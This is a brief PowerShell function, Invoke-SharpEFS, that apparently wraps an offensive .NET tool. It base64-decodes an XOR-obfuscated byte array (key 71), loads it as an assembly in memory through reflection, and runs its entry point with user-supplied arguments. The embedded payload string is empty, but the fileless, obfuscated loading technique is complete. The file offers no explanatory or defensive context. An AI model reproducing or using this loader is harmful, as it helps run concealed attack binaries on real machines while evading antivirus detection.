function Invoke-SharpEFS {
    param (
        [string]$Params
    )
    if (!$fileassembly) {
        $xorfilebytes = [Convert]::FromBase64String("");
        for($i=0; $i -lt $xorfilebytes.count ; $i++){ $xorfilebytes[$i] = $xorfilebytes[$i] -bxor 71 };
        $fileassembly = [System.Reflection.Assembly]::Load($xorfilebytes)
    }
    $fileassembly.EntryPoint.Invoke($null,(, $Params.split()))
}
